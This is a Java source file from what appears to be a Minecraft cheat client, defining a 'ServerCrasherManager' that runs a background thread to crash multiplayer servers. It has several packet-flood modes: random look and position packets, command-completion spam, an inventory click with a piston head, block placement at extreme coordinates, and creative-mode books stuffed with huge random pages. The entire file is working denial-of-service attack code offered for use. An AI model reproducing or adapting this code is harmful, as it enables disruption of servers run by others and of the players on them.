package me.constantindev.ccl.etc.ms;

import me.constantindev.ccl.Cornos;
import me.constantindev.ccl.etc.helper.RandomHelper;
import me.constantindev.ccl.etc.reg.ModuleRegistry;
import net.minecraft.block.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

@SuppressWarnings("BusyWait")
public class ServerCrasherManager {
    public static int strength = 100;
    public static String mode = "";
    public static Thread runner = new Thread(() -> {
        while (true) {
            try {
                if (!ModuleRegistry.getByName("servercrasher").isOn.isOn()) {
                    Thread.sleep(10);
                    continue;
                }
                if (Cornos.minecraft.getNetworkHandler() == null) {
                    ModuleRegistry.getByName("servercrasher").isOn.setState(false);
                    continue;
                }
                Random r = new Random();
                switch (mode) {
                    case "rotation":
                        int yaw = r.nextInt(65535);
                        int pitch = r.nextInt(65535);
                        Cornos.minecraft.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.LookOnly(yaw, pitch, true));
                        break;
                    case "location":
                        double x = r.nextDouble();
                        double z = r.nextDouble();
                        assert Cornos.minecraft.player != null;
                        BlockPos pp = Cornos.minecraft.player.getBlockPos();
                        Cornos.minecraft.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionOnly(pp.getX() + x, pp.getY(), pp.getZ() + z, true));
                        break;
                    case "biglocation":
                        double x1 = r.nextDouble() * 10;
                        double z1 = r.nextDouble() * 10;
                        assert Cornos.minecraft.player != null;
                        BlockPos pp1 = Cornos.minecraft.player.getBlockPos();
                        Cornos.minecraft.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionOnly(pp1.getX() + x1, pp1.getY(), pp1.getZ() + z1, true));
                        break;
                    case "tabcomplete":
                        net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket packet = new RequestCommandCompletionsC2SPacket(0, "/");
                        net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket packet1 = new RequestCommandCompletionsC2SPacket(0, "/");
                        Cornos.minecraft.getNetworkHandler().sendPacket(packet1);
                        Cornos.minecraft.getNetworkHandler().sendPacket(packet);
                        break;
                    case "pistonheadclick":
                        ItemStack is = new ItemStack(Blocks.PISTON_HEAD);
                        Cornos.minecraft.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(0, 0, 0, SlotActionType.values()[1], is, (short) 0));
                        break;
                    case "blockplace":
                        BlockPos bp = new BlockPos(Double.MAX_VALUE, 1, Double.MAX_VALUE);
                        BlockHitResult blockHitResult = new BlockHitResult(new Vec3d(bp.getX(), bp.getY(), bp.getZ()), Direction.DOWN, bp, false);
                        net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket p = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, blockHitResult);
                        Cornos.minecraft.getNetworkHandler().sendPacket(p);
                        break;
                    case "blockspam":
                        assert Cornos.minecraft.player != null;
                        BlockPos b = Cornos.minecraft.player.getBlockPos();
                        BlockPos off = new BlockPos(r.nextInt(6) - 3, r.nextInt(6) - 3, r.nextInt(6) - 3);
                        BlockPos np = new BlockPos(b.getX() + off.getX(), b.getY() + off.getY(), b.getZ() + off.getZ());
                        BlockHitResult bhr = new BlockHitResult(new Vec3d(1, 1, 1), Direction.DOWN, np, false);
                        net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket p1 = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr);
                        Cornos.minecraft.getNetworkHandler().sendPacket(p1);
                        break;
                    case "bookgivespam":
                        ItemStack ist = new ItemStack(Items.WRITTEN_BOOK);
                        CompoundTag ct = ist.getOrCreateTag();
                        ct.putString("title", "Come play with me");
                        assert Cornos.minecraft.player != null;
                        ct.putString("author", Cornos.minecraft.player.getName().asString());
                        net.minecraft.nbt.ListTag listTag = new ListTag();
                        for (int pp2 = 0; pp2 < 50; pp2++) {
                            listTag.add(StringTag.of(RandomHelper.rndBinStr(0xFFF)));
                        }
                        ct.put("pages", listTag);
                        ist.setTag(ct);
                        ist.putSubTag("pages", listTag);
                        CreativeInventoryActionC2SPacket p2 = new CreativeInventoryActionC2SPacket(20, ist);

                        Cornos.minecraft.getNetworkHandler().sendPacket(p2);
                        break;
                }
                Thread.sleep(100 / strength - 1);
            } catch (Exception ignored) {
                ModuleRegistry.getByName("servercrasher").isOn.setState(false);
            }
        }
    });
}
